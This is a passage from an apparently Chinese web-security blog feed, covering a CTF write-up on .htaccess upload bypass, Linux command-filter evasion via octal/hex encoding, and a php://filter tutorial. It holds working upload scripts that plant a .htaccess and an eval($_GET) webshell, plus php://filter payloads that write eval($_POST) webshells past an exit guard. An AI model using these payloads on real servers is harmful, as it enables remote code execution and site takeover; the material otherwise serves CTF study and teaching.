href="https://github.com/php/php-src/blob/e219ec144ef6682b71e135fd18654ee1bb4676b4/ext/standard/image.c">https://github.com/php/php-src/blob/e219ec144ef6682b71e135fd18654ee1bb4676b4/ext/standard/image.c</a></p><p>php源码中对于图片头的检查如下：</p><div class="hljs code-wrapper"><pre><code class="hljs c">PHPAPI <span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span> php_sig_gif[<span class="hljs-number">3</span>] = &#123;<span class="hljs-string">&#x27;G&#x27;</span>, <span class="hljs-string">&#x27;I&#x27;</span>, <span class="hljs-string">&#x27;F&#x27;</span>&#125;;PHPAPI <span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span> php_sig_psd[<span class="hljs-number">4</span>] = &#123;<span class="hljs-string">&#x27;8&#x27;</span>, <span class="hljs-string">&#x27;B&#x27;</span>, <span class="hljs-string">&#x27;P&#x27;</span>, <span class="hljs-string">&#x27;S&#x27;</span>&#125;;PHPAPI <span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span> php_sig_bmp[<span class="hljs-number">2</span>] = &#123;<span class="hljs-string">&#x27;B&#x27;</span>, <span class="hljs-string">&#x27;M&#x27;</span>&#125;;PHPAPI <span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span> php_sig_swf[<span class="hljs-number">3</span>] = &#123;<span class="hljs-string">&#x27;F&#x27;</span>, <span class="hljs-string">&#x27;W&#x27;</span>, <span class="hljs-string">&#x27;S&#x27;</span>&#125;;PHPAPI <span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span> php_sig_swc[<span class="hljs-number">3</span>] = &#123;<span class="hljs-string">&#x27;C&#x27;</span>, <span class="hljs-string">&#x27;W&#x27;</span>, <span class="hljs-string">&#x27;S&#x27;</span>&#125;;PHPAPI <span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span> php_sig_jpg[<span class="hljs-number">3</span>] = &#123;(<span class="hljs-keyword">char</span>) <span class="hljs-number">0xff</span>, (<span class="hljs-keyword">char</span>) <span class="hljs-number">0xd8</span>, (<span class="hljs-keyword">char</span>) <span class="hljs-number">0xff</span>&#125;;PHPAPI <span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span> php_sig_png[<span class="hljs-number">8</span>] = &#123;(<span class="hljs-keyword">char</span>) <span class="hljs-number">0x89</span>, (<span class="hljs-keyword">char</span>) <span class="hljs-number">0x50</span>, (<span class="hljs-keyword">char</span>) <span class="hljs-number">0x4e</span>, (<span class="hljs-keyword">char</span>) <span class="hljs-number">0x47</span>,                                    (<span class="hljs-keyword">char</span>) <span class="hljs-number">0x0d</span>, (<span class="hljs-keyword">char</span>) <span class="hljs-number">0x0a</span>, (<span class="hljs-keyword">char</span>) <span class="hljs-number">0x1a</span>, (<span class="hljs-keyword">char</span>) <span class="hljs-number">0x0a</span>&#125;;PHPAPI <span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span> php_sig_tif_ii[<span class="hljs-number">4</span>] = &#123;<span class="hljs-string">&#x27;I&#x27;</span>,<span class="hljs-string">&#x27;I&#x27;</span>, (<span class="hljs-keyword">char</span>)<span class="hljs-number">0x2A</span>, (<span class="hljs-keyword">char</span>)<span class="hljs-number">0x00</span>&#125;;PHPAPI <span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span> php_sig_tif_mm[<span class="hljs-number">4</span>] = &#123;<span class="hljs-string">&#x27;M&#x27;</span>,<span class="hljs-string">&#x27;M&#x27;</span>, (<span class="hljs-keyword">char</span>)<span class="hljs-number">0x00</span>, (<span class="hljs-keyword">char</span>)<span class="hljs-number">0x2A</span>&#125;;PHPAPI <span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span> php_sig_jpc[<span class="hljs-number">3</span>]  = &#123;(<span class="hljs-keyword">char</span>)<span class="hljs-number">0xff</span>, (<span class="hljs-keyword">char</span>)<span class="hljs-number">0x4f</span>, (<span class="hljs-keyword">char</span>)<span class="hljs-number">0xff</span>&#125;;PHPAPI <span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span> php_sig_jp2[<span class="hljs-number">12</span>] = &#123;(<span class="hljs-keyword">char</span>)<span class="hljs-number">0x00</span>, (<span class="hljs-keyword">char</span>)<span class="hljs-number">0x00</span>, (<span class="hljs-keyword">char</span>)<span class="hljs-number">0x00</span>, (<span class="hljs-keyword">char</span>)<span class="hljs-number">0x0c</span>,                                     (<span class="hljs-keyword">char</span>)<span class="hljs-number">0x6a</span>, (<span class="hljs-keyword">char</span>)<span class="hljs-number">0x50</span>, (<span class="hljs-keyword">char</span>)<span class="hljs-number">0x20</span>, (<span class="hljs-keyword">char</span>)<span class="hljs-number">0x20</span>,                                     (<span class="hljs-keyword">char</span>)<span class="hljs-number">0x0d</span>, (<span class="hljs-keyword">char</span>)<span class="hljs-number">0x0a</span>, (<span class="hljs-keyword">char</span>)<span class="hljs-number">0x87</span>, (<span class="hljs-keyword">char</span>)<span class="hljs-number">0x0a</span>&#125;;PHPAPI <span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span> php_sig_iff[<span class="hljs-number">4</span>] = &#123;<span class="hljs-string">&#x27;F&#x27;</span>,<span class="hljs-string">&#x27;O&#x27;</span>,<span class="hljs-string">&#x27;R&#x27;</span>,<span class="hljs-string">&#x27;M&#x27;</span>&#125;;PHPAPI <span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span> php_sig_ico[<span class="hljs-number">4</span>] = &#123;(<span class="hljs-keyword">char</span>)<span class="hljs-number">0x00</span>, (<span class="hljs-keyword">char</span>)<span class="hljs-number">0x00</span>, (<span class="hljs-keyword">char</span>)<span class="hljs-number">0x01</span>, (<span class="hljs-keyword">char</span>)<span class="hljs-number">0x00</span>&#125;;PHPAPI <span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span> php_sig_riff[<span class="hljs-number">4</span>] = &#123;<span class="hljs-string">&#x27;R&#x27;</span>, <span class="hljs-string">&#x27;I&#x27;</span>, <span class="hljs-string">&#x27;F&#x27;</span>, <span class="hljs-string">&#x27;F&#x27;</span>&#125;;PHPAPI <span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span> php_sig_webp[<span class="hljs-number">4</span>] = &#123;<span class="hljs-string">&#x27;W&#x27;</span>, <span class="hljs-string">&#x27;E&#x27;</span>, <span class="hljs-string">&#x27;B&#x27;</span>, <span class="hljs-string">&#x27;P&#x27;</span>&#125;;</code></pre></div><p>满足要求的有jp2和ico</p><p>但是ico的长度最多是0xff，为1337是0x539</p><p>jp2 只修改header不能改变getimagesize的结果</p><p>查询到wbmp图像可以</p><p><img src="http://de34dnotespics.oss-cn-beijing.aliyuncs.com/img/image-20200914084822368.png" alt="image-20200914084822368"></p><p>然后用此链接<a href="https://image.online-convert.com/convert-to-wbmp%E7%94%9F%E6%88%90%E4%B8%80%E4%B8%AA1337*1337%E5%A4%A7%E5%B0%8F%E7%9A%84%E5%9B%BE%E5%83%8F%EF%BC%8C%E7%84%B6%E5%90%8E%E5%88%A0%E9%99%A4%E5%8F%AA%E7%95%99%6000008A398A39%60">https://image.online-convert.com/convert-to-wbmp生成一个1337*1337大小的图像，然后删除只留`00008A398A39`</a> 这些即可满足type为wbmp长宽高为1337</p><div class="hljs code-wrapper"><pre><code class="hljs bash">root@drom-virtual-machine:/home/drom/图片<span class="hljs-comment"># xxd 11.wbmp  | head</span>00000000: 0000 8a39 8a39 ffff ffff ffff ffff ffff  ...9.9..........00000010: ffff ffff ffff ffff ffff ffff ffff ffff  ................00000020: ffff ffff ffff ffff ffff ffff ffff ffff  ................00000030: ffff ffff ffff ffff ffff ffff ffff ffff  ................00000040: ffff ffff ffff ffff ffff ffff ffff ffff  ................00000050: ffff ffff ffff ffff ffff ffff ffff ffff  ................00000060: ffff ffff ffff ffff ffff ffff ffff ffff  ................00000070: ffff ffff ffff ffff ffff ffff ffff ffff  ................00000080: ffff ffff ffff ffff ffff ffff ffff ffff  ................00000090: ffff ffff ffff ffff ffff ffff ffff ffff  ................</code></pre></div><p>文件头为0000 8a39 8a39，只留这部分即可</p><p>对于不能写&lt;?可以使用php://filter/covert.base64-decode/resource=shell.wuwu</p><div class="hljs code-wrapper"><pre><code class="hljs applescript">AddType <span class="hljs-built_in">application</span>/x-httpd-php .wuwuphp_value auto_append_file <span class="hljs-string">&quot;php://filter/convert.base64-decode/resource=/var/www/html/images/1222a98e5b5a6fd81ff8761be852e16e75b18703/shell.wuwu&quot;</span></code></pre></div><p>还需要考虑的是在base64decode后能够正常反序列化出语句。</p><div class="hljs code-wrapper"><pre><code class="hljs python">shell = <span class="hljs-string">b&quot;\x00\x00\x8a\x39\x8a\x39&quot;</span>+<span class="hljs-string">b&quot;\x39\x39&quot;</span>+ base64.b64encode(<span class="hljs-string">b&quot;&lt;?php phpinfo();?&gt;&quot;</span>)</code></pre></div><p>可以编码的字符为\x39，由于前面只有两个，而base64是4个一组，所以需要再填充两个字符，b”\x39\x39”</p><p>payload</p><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<span class="hljs-keyword">import</span> base64url = <span class="hljs-string">&#x27;http://192.168.1.22:8000/index.php&#x27;</span>php_sessionID = <span class="hljs-string">&quot;tj3kr62k12a7nrj33evue8qkhq&quot;</span>Cookies = &#123;    <span class="hljs-string">&#x27;XDEBUG_SESSION&#x27;</span>:<span class="hljs-string">&#x27;XDEBUG_ECLIPSE&#x27;</span>,    <span class="hljs-string">&#x27;PHPSESSID&#x27;</span>:php_sessionID&#125;file_content = <span class="hljs-string">b&quot;&quot;&quot;\x00\x00\x8a\x39\x8a\x39</span><span class="hljs-string">AddType application/x-httpd-php .wuwu</span><span class="hljs-string">php_value auto_append_file &quot;php://filter/convert.base64-decode/resource=/var/www/html/images/1222a98e5b5a6fd81ff8761be852e16e75b18703/shell.wuwu&quot;</span><span class="hljs-string">&quot;&quot;&quot;</span><span class="hljs-comment"># php://filter/convert.base64-decode/resource=/var/www/html/images/e694a9e3c406b3d8b247d73836958f6303ed7b72/shell.wuwu</span>data = &#123;    <span class="hljs-string">&#x27;upload&#x27;</span>:<span class="hljs-string">&#x27;submit&#x27;</span>&#125;shell = <span class="hljs-string">b&quot;\x00\x00\x8a\x39\x8a\x39&quot;</span>+<span class="hljs-string">b&quot;\x39\x39&quot;</span>+ base64.b64encode(<span class="hljs-string">b&quot;&lt;?php phpinfo();?&gt;&quot;</span>)normal = <span class="hljs-string">b&quot;\x00\x00\x8a\x39\x8a\x39&quot;</span> + <span class="hljs-string">b&quot;&quot;</span>;files = &#123;    <span class="hljs-string">&#x27;image&#x27;</span>:(        <span class="hljs-string">&#x27;shell.wuwu&#x27;</span>,        shell,        <span class="hljs-string">&#x27;application/octet-stream&#x27;</span>    )&#125;proxies = &#123;    <span class="hljs-string">&#x27;http&#x27;</span>:<span class="hljs-string">&#x27;http://127.0.0.1:8080&#x27;</span>&#125;s = requests.session()r = s.post(url,cookies=Cookies,data=data,files=files,proxies=proxies).textprint(r)<span class="hljs-comment"># images/295be839f519b2a6dac30e8e472ca45856fcb402/</span></code></pre></div><p>题目的后半段为绕过disable_function</p><h2 id="0x07-利用脚本"><a href="#0x07-利用脚本" class="headerlink" title="0x07 利用脚本"></a>0x07 利用脚本</h2><h3 id="通用上传-文件类型绕过脚本"><a href="#通用上传-文件类型绕过脚本" class="headerlink" title="通用上传+文件类型绕过脚本"></a>通用上传+文件类型绕过脚本</h3><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<span class="hljs-keyword">import</span> base64url = <span class="hljs-string">&quot;http://35.246.234.136/?&quot;</span>header = &#123;<span class="hljs-string">&quot;Cookie&quot;</span>:<span class="hljs-string">&quot;PHPSESSID=58eshi3a265dguf0icnkc6qk5a&quot;</span>&#125;<span class="hljs-comment">#这里是使用xxd查看的文件16进制</span>htaccess = <span class="hljs-string">b&quot;&quot;&quot;\x00\x00\x8a\x39\x8a\x39 </span><span class="hljs-string">AddType application/x-httpd-php .wuwu</span><span class="hljs-string">php_value auto_append_file &quot;php://filter/convert.base64-decode/resource=/var/www/html/images/e694a9e3c406b3d8b247d73836958f6303ed7b72/shell.wuwu&quot;</span><span class="hljs-string">&quot;&quot;&quot;</span>shell = <span class="hljs-string">b&quot;\x00\x00\x8a\x39\x8a\x39&quot;</span>+<span class="hljs-string">b&quot;00&quot;</span>+ base64.b64encode(<span class="hljs-string">b&quot;&lt;?php eval($_GET[&#x27;c&#x27;]);?&gt;&quot;</span>)files = [(<span class="hljs-string">&#x27;image&#x27;</span>,(<span class="hljs-string">&#x27;.htaccess&#x27;</span>,htaccess,<span class="hljs-string">&#x27;application/octet-stream&#x27;</span>))]data = &#123;<span class="hljs-string">&quot;upload&quot;</span>:<span class="hljs-string">&quot;Submit&quot;</span>&#125;proxies = &#123;<span class="hljs-string">&quot;http&quot;</span>:<span class="hljs-string">&quot;http://127.0.0.1:8080&quot;</span>&#125;print(<span class="hljs-string">&quot;upload .htaccess&quot;</span>)r = requests.post(url=url, data=data, files=files,headers=header)<span class="hljs-comment">#proxies=proxies)</span><span class="hljs-comment"># print(r.text) </span>print(<span class="hljs-string">&quot;upload shell.wuwu&quot;</span>)files = [(<span class="hljs-string">&#x27;image&#x27;</span>,(<span class="hljs-string">&#x27;shell.wuwu&#x27;</span>,shell,<span class="hljs-string">&#x27;application/octet-stream&#x27;</span>))]r = requests.post(url=url, data=data, files=files,headers=header)</code></pre></div><h3 id="php配置弱点检查脚本"><a href="#php配置弱点检查脚本" class="headerlink" title="php配置弱点检查脚本"></a>php配置弱点检查脚本</h3><ul><li><a href="https://github.com/sektioneins/pcc">pcc</a></li></ul><p><img src="http://de34dnotespics.oss-cn-beijing.aliyuncs.com/img/image-20200913083448243.png" alt="image-20200913083448243"></p><h2 id="0x08-php安全加固"><a href="#0x08-php安全加固" class="headerlink" title="0x08 php安全加固"></a>0x08 php安全加固</h2><ul><li><a href="https://www.alibabacloud.com/help/zh/faq-detail/50218.htm">PHP环境安全加固</a></li></ul><h2 id="0x09-工具"><a href="#0x09-工具" class="headerlink" title="0x09 工具"></a>0x09 工具</h2><h3 id="htshell"><a href="#htshell" class="headerlink" title="htshell"></a>htshell</h3><ul><li><a href="https://github.com/wireghoul/htshells">https://github.com/wireghoul/htshells</a></li></ul><h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><ul><li><a href="https://www.cnblogs.com/IT-LM/p/6829209.html">php .htaccess文件使用详解</a></li><li><a href="https://blog.51cto.com/wujianwei/2163907">apache配置rewrite及.htaccess文件</a></li><li><a href="https://www.freebuf.com/vuls/218495.html">Apache中.htaccess文件利用的总结与新思路拓展</a></li><li><a href="https://www.awaimai.com/371.html">CGI、FastCGI和PHP-FPM关系图解</a></li><li><a href="https://github.com/wireghoul/htshells">https://github.com/wireghoul/htshells</a></li><li><a href="https://github.com/sektioneins/pcc">pcc</a></li><li><a href="https://www.php.net/manual/zh/ini.list.php#ini.list"><em>php.ini 配置选项列表</em></a></li></ul>]]></content>
    
    
    <categories>
      
      <category>web安全</category>
      
      <category>php</category>
      
      <category>.htaccess</category>
      
      <category>.htaccess</category>
      
    </categories>
    
    
    <tags>
      
      <tag>php</tag>
      
      <tag>web安全</tag>
      
      <tag>ctf</tag>
      
      <tag>.htaccess</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>linux 命令执行绕过思路</title>
    <link href="/2020/10/28/linux-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E7%BB%95%E8%BF%87%E6%80%9D%E8%B7%AF/"/>
    <url>/2020/10/28/linux-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E7%BB%95%E8%BF%87%E6%80%9D%E8%B7%AF/</url>
    
    <content type="html"><![CDATA[<h2 id="绕过思路"><a href="#绕过思路" class="headerlink" title="绕过思路"></a>绕过思路</h2><h3 id="dash-八进制绕过-配合-40-41"><a href="#dash-八进制绕过-配合-40-41" class="headerlink" title="dash 八进制绕过(配合$&#40; &#41;)"></a>dash 八进制绕过(配合$&#40; &#41;)</h3><div class="hljs code-wrapper"><pre><code class="hljs python">a = <span class="hljs-string">&#x27;ls /dev&#x27;</span>exp = <span class="hljs-string">&#x27;&#x27;</span><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> a:    z = <span class="hljs-built_in">str</span>(<span class="hljs-built_in">oct</span>(<span class="hljs-built_in">ord</span>(i))).replace(<span class="hljs-string">&#x27;0o&#x27;</span>,<span class="hljs-string">&#x27;\\&#x27;</span>)    exp += zprint(exp)</code></pre></div><div class="hljs code-wrapper"><pre><code class="hljs sh">$(<span class="hljs-built_in">printf</span>$IFS<span class="hljs-variable">$9</span><span class="hljs-string">&quot;\57\162\145\141\144\146\154\141\147&quot;</span>)</code></pre></div><h3 id="bash-十六进制绕过-配合-40-41"><a href="#bash-十六进制绕过-配合-40-41" class="headerlink" title="bash 十六进制绕过(配合$&#40; &#41;)"></a>bash 十六进制绕过(配合$&#40; &#41;)</h3><div class="hljs code-wrapper"><pre><code class="hljs python">a = <span class="hljs-string">&#x27;ls /dev&#x27;</span>exp = <span class="hljs-string">&#x27;&#x27;</span><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> a:    z = <span class="hljs-built_in">str</span>(<span class="hljs-built_in">hex</span>(<span class="hljs-built_in">ord</span>(i))).replace(<span class="hljs-string">&#x27;0x&#x27;</span>,<span class="hljs-string">&#x27;\\&#x27;</span>)    exp += zprint(exp)</code></pre></div><h4 id="例题：2020-XCTF高校网络安全专题挑战赛（Web部分）-HIDS"><a href="#例题：2020-XCTF高校网络安全专题挑战赛（Web部分）-HIDS" class="headerlink" title="例题：2020 XCTF高校网络安全专题挑战赛（Web部分） HIDS"></a>例题：<a href="https://whoamianony.top/2020/12/27/ctf-bi-sai-ji-lu/xctf-gao-xiao-wang-luo-an-quan-zhuan-ti-tiao-zhan-sai-writeup/#toc-heading-7">2020 XCTF高校网络安全专题挑战赛（Web部分） HIDS</a></h4>]]></content>
    
    
    <categories>
      
      <category>web安全</category>
      
      <category>命令执行</category>
      
    </categories>
    
    
    <tags>
      
      <tag>linux</tag>
      
      <tag>命令执行</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>php://filter利用手法</title>
    <link href="/2020/10/28/php-filter%E5%88%A9%E7%94%A8%E6%89%8B%E6%B3%95/"/>
    <url>/2020/10/28/php-filter%E5%88%A9%E7%94%A8%E6%89%8B%E6%B3%95/</url>
    
    <content type="html"><![CDATA[<h1 id="php-filter利用手法"><a href="#php-filter利用手法" class="headerlink" title="php://filter利用手法"></a>php://filter利用手法</h1><p>常见payload</p><p><code>file=php://filter/read=convert.base64-encode/resource=index.php</code></p><p><code>php://filter/write=convert.base64-decode/resource=shell.php</code></p><div class="hljs code-wrapper"><pre><code class="hljs bash">resource=&lt;要过滤的数据流&gt;     这个参数是必须的。它指定了你要筛选过滤的数据流。<span class="hljs-built_in">read</span>=&lt;读链的筛选列表&gt;         该参数可选。可以设定一个或多个过滤器名称，以管道符（|）分隔。write=&lt;写链的筛选列表&gt;    该参数可选。可以设定一个或多个过滤器名称，以管道符（|）分隔。&lt;；两个链的筛选列表&gt;        任何没有以 <span class="hljs-built_in">read</span>= 或 write= 作前缀 的筛选器列表会视情况应用于读或写链。</code></pre></div><h3 id="字符串过滤器"><a href="#字符串过滤器" class="headerlink" title="字符串过滤器"></a>字符串过滤器</h3><div class="hljs code-wrapper"><pre><code class="hljs bash">string.rot13  进行rot13转换string.toupper  将字符全部大写string.tolower  将字符全部小写string.strip_tags 去除空字符、HTML 和 PHP 标记后的结果。功能类似于strip_tags()函数，若不想某些字符不被消除，后面跟上字符，可利用字符串或是数组两种方式。（自PHP 7.3.0起已弃用此功能。）</code></pre></div><h3 id="转换过滤器"><a href="#转换过滤器" class="headerlink" title="转换过滤器"></a>转换过滤器</h3><div class="hljs code-wrapper"><pre><code class="hljs maxima"><span class="hljs-built_in">convert</span>.<span class="hljs-built_in">base64</span>-encode<span class="hljs-built_in">convert</span>.<span class="hljs-built_in">base64</span>-decode</code></pre></div><h3 id="压缩过滤器"><a href="#压缩过滤器" class="headerlink" title="压缩过滤器"></a>压缩过滤器</h3><div class="hljs code-wrapper"><pre><code class="hljs nsis"><span class="hljs-literal">zlib</span>.deflate 压缩<span class="hljs-literal">zlib</span>.inflate 解压<span class="hljs-literal">bzip2</span>.compress<span class="hljs-literal">bzip2</span>.decompress</code></pre></div><h3 id="加密过滤器"><a href="#加密过滤器" class="headerlink" title="加密过滤器"></a>加密过滤器</h3><h2 id="0x01-XXE中的使用"><a href="#0x01-XXE中的使用" class="headerlink" title="0x01 XXE中的使用"></a>0x01 XXE中的使用</h2><p>在XXE中，我们也可以将PHP等容易引发冲突的文件流用php://filter协议流处理一遍，这样就能有效规避特殊字符造成混乱。</p><p>如下，我们使用的是<code>php://filter/read=convert.base64-encode/resource=./xxe.php</code></p><p><img src="http://de34dnotespics.oss-cn-beijing.aliyuncs.com/img/thum-693b1469385893.png" alt="QQ截图20160724235335.png"></p><h2 id="0x02-file-put-contents-filename-”-lt-php-exit-”-content"><a href="#0x02-file-put-contents-filename-”-lt-php-exit-”-content" class="headerlink" title="0x02 file_put_contents($filename,”&lt;?php exit();”.$content);"></a>0x02 file_put_contents($filename,”&lt;?php exit();”.$content);</h2><h3 id="1-base64-decode绕过exit"><a href="#1-base64-decode绕过exit" class="headerlink" title="1. base64-decode绕过exit"></a>1. base64-decode绕过exit</h3><div class="hljs code-wrapper"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><span class="hljs-variable">$content</span> = <span class="hljs-string">&#x27;&lt;?php exit; ?&gt;&#x27;</span>;<span class="hljs-variable">$content</span> .= <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;txt&#x27;</span>];file_put_contents(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;filename&#x27;</span>], <span class="hljs-variable">$content</span>);</code></pre></div><p><code>$content</code>在开头增加了exit过程，导致即使我们成功写入一句话，也执行不了（这个过程在实战中十分常见，通常出现在缓存、配置文件等等地方，不允许用户直接访问的文件，都会被加上if(!defined(xxx))exit;之类的限制）。那么这种情况下，如何绕过这个“死亡exit”？</p><p>我们即可使用 php://filter协议来施展魔法：<strong>使用php://filter流的base64-decode方法，将<code>$content</code>解码，利用php base64_decode函数特性去除“死亡exit”。</strong></p><p>base64编码中只包含64个可打印字符，而PHP在解码base64时，遇到不在其中的字符时，将会跳过这些字符，仅将合法字符组成一个新的字符串进行解码。</p><p>所以，一个正常的base64_decode实际上可以理解为如下两个步骤：</p><div class="hljs code-wrapper"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;txt&#x27;</span>] = preg_replace(<span class="hljs-string">&#x27;|[^a-z0-9A-Z+/]|s&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>, <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;txt&#x27;</span>]);base64_decode(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;txt&#x27;</span>]);</code></pre></div><p>所以，当<code>$content</code>被加上了<code>&lt;?php exit; ?&gt;</code>以后，我们可以使用 php://filter/write=convert.base64-decode 来首先对其解码。在解码的过程中，<strong>字符&lt;、?、;、&gt;、空格等一共有7个字符不符合base64编码的字符范围将被忽略，所以最终被解码的字符仅有“phpexit”和我们传入的其他字符。</strong></p><p><strong>“phpexit”一共7个字符，因为base64算法解码时是4个byte一组，所以给他增加1个“a”一共8个字符。这样，”phpexita”被正常解码，</strong>而后面我们传入的webshell的base64内容也被正常解码。结果就是<code>&lt;?php exit; ?&gt;</code>没有了。</p><p>payload：</p><div class="hljs code-wrapper"><pre><code class="hljs bash">txt=aPD9waHAgZXZhbCgkX1BPU1RbJ3Bhc3MnXSk7Pz4=&amp;filename=php://filter/write=convert.base64-decode/resource=shell.php</code></pre></div><p><img src="http://de34dnotespics.oss-cn-beijing.aliyuncs.com/img/image-20200906091228807.png" alt="image-20200906091228807"></p><h3 id="2-strip-tags-base64-decode组合利用"><a href="#2-strip-tags-base64-decode组合利用" class="headerlink" title="2. strip_tags+base64-decode组合利用"></a>2. strip_tags+base64-decode组合利用</h3><p>这个<code>&lt;?php exit; ?&gt;</code>实际上是什么？</p><p>实际上是一个XML标签，既然是XML标签，我们就可以利用strip_tags函数去除它，而php://filter刚好是支持这个方法的。</p><p>编写如下测试代码即可查看 php://filter/read=string.strip_tags/resource=php://input 的效果：</p><div class="hljs code-wrapper"><pre><code class="hljs lisp">echo readfile(&#x27;php<span class="hljs-symbol">://filter/read=string</span>.strip_tags/resource=php<span class="hljs-symbol">://input</span>&#x27;)<span class="hljs-comment">;</span></code></pre></div><p><a href="https://www.leavesongs.com/content/uploadfile/201607/499a1469385895.png"><img src="http://de34dnotespics.oss-cn-beijing.aliyuncs.com/img/thum-499a1469385895.png" alt="QQ截图20160725010403.png"></a></p><p>可见，<code>&lt;?php exit; ?&gt;</code>被去除了。但回到上面的题目，我们最终的目的是写入一个webshell，而写入的webshell也是php代码，如果使用strip_tags同样会被去除。</p><p>万幸的是，<strong>php://filter允许使用多个过滤器，我们可以先将webshell用base64编码。在调用完成strip_tags后再进行base64-decode</strong>。“死亡exit”在第一步被去除，而webshell在第二步被还原。</p><p>payload</p><div class="hljs code-wrapper"><pre><code class="hljs bash">txt=PD9waHAgZXZhbCgkX1BPU1RbJ3Bhc3MnXSk7Pz4=&amp;filename=php://filter/write=string.strip_tags|convert.base64-decode/resource=shell.php</code></pre></div><h3 id="3-rot13"><a href="#3-rot13" class="headerlink" title="3. rot13"></a>3. rot13</h3><p>除此之外，我们还可以**利用rot13编码独立完成任务。原理和上面类似，核心是将“死亡exit”去除。<code>&lt;?php exit; ?&gt;</code>在经过rot13编码后会变成<code>&lt;?cuc rkvg; ?&gt;</code>**，在PHP不开启short_open_tag时，php不认识这个字符串，当然也就不会执行了：</p><p>payload</p><div class="hljs code-wrapper"><pre><code class="hljs awk">php:<span class="hljs-regexp">//</span>filter<span class="hljs-regexp">/write=string.rot13/</span>resource=shell.php</code></pre></div><p>这种方法是需要服务器<strong>没有开启短标签</strong>的时候才可以使用（默认情况是没开启的：php.ini中的short_open_tag）</p><h3 id="4-加入不存在的过滤器"><a href="#4-加入不存在的过滤器" class="headerlink" title="4. 加入不存在的过滤器"></a>4. 加入不存在的过滤器</h3><p>上面的场景中，考虑如下的payload：</p><p><code>php://filter/write=string.strip_tags|sssss|convert.base64-decode/resource=shell.php</code></p><p>其中ssss过滤器不存在，但是不妨碍我们写入shell，此处php只会报一个warning，并不会结束运行。</p><p><img src="http://de34dnotespics.oss-cn-beijing.aliyuncs.com/img/image-20200906103602914.png" alt="image-20200906103602914"></p><h2 id="0x03-file-put-contents-a-”-lt-php-exit-”-a"><a href="#0x03-file-put-contents-a-”-lt-php-exit-”-a" class="headerlink" title="0x03 file_put_contents($a,”&lt;?php exit();”.$a);"></a>0x03 file_put_contents($a,”&lt;?php exit();”.$a);</h2><div class="hljs code-wrapper"><pre><code class="hljs php">file_put_contents(<span class="hljs-variable">$a</span>,<span class="hljs-string">&quot;&lt;?php exit();&quot;</span>.<span class="hljs-variable">$a</span>);</code></pre></div><h3 id="1-base64"><a href="#1-base64" class="headerlink" title="1. base64"></a>1. base64</h3><p><code>$a = php://filter/write=convert.base64-decode|PD9waHAgcGhwaW5mbygpOz8+|/resource=Cyc1e.php</code></p><p><strong>php://filter面对不可用的规则是报个Warning，然后跳过继续执行的（不会退出）</strong>，所以按理说这样构造是<strong>“很完美”</strong>的，我们看下base-decode哪些字符👇</p><div class="hljs code-wrapper"><pre><code class="hljs apache"><span class="hljs-attribute">php</span>//filter/write=convertbase<span class="hljs-number">64</span>decodePD<span class="hljs-number">9</span>waHAgcGhwaW<span class="hljs-number">5</span>mbygpOz<span class="hljs-number">8</span>+/resource=Cyc<span class="hljs-number">1</span>e.php</code></pre></div><p>而默认情况下base64编码是以 <code>=</code> 作为结尾的，所以<strong>正常解码的时候到了 <code>=</code> 就解码结束了</strong>，即使我们构造payload的时候不用<code>write=</code>，但是在最后获取文件名的时候<code>resource=</code>中的 <code>=</code> 过不掉，所以导致过滤器解码失败，<strong>从而报错（不过还是会创建文件的，内容由于解码过程出错了，就都丢弃了）</strong></p><h3 id="2-rot13"><a href="#2-rot13" class="headerlink" title="2. rot13"></a>2. rot13</h3><p>rot13编码就不存在base64的问题，所以和前面base64构造的思路一样👇</p><div class="hljs code-wrapper"><pre><code class="hljs livecodeserver">$<span class="hljs-keyword">a</span> = php://<span class="hljs-built_in">filter</span>/<span class="hljs-built_in">write</span>=<span class="hljs-keyword">string</span>.rot13|<span class="hljs-meta">&lt;?</span>cuc cucvasb();<span class="hljs-meta">?&gt;</span>|/resource=Cyc1e.php</code></pre></div><p><img src="https://cyc1e183.github.io/2020/04/03/%E5%85%B3%E4%BA%8Efile_put_contents%E7%9A%84%E4%B8%80%E4%BA%9B%E5%B0%8F%E6%B5%8B%E8%AF%95/image-20200403160545137.png" alt="img"></p><p>和前面提到的一样，这种方法是需要服务器<strong>没有开启短标签</strong>的时候才可以使用（默认情况是没开启的：php.ini中的short_open_tag（再补充一下，linux下默认是没有开启的））</p><h3 id="3-iconv字符编码转换"><a href="#3-iconv字符编码转换" class="headerlink" title="3. iconv字符编码转换"></a>3. iconv字符编码转换</h3><p>这种方法由于之前没有见过，所以感觉这波操作比我的亚索还要秀~，想法是一样的，<strong>通过字符转换把<code>&lt;?php exit();</code>转成不能解析的，这里采用的是UCS-2或者UCS-4编码方式（当然还有很多，比如utf-8和utf-7），而我们构造的转成可正常解析的</strong></p><p>官方文档中支持的</p><div class="hljs 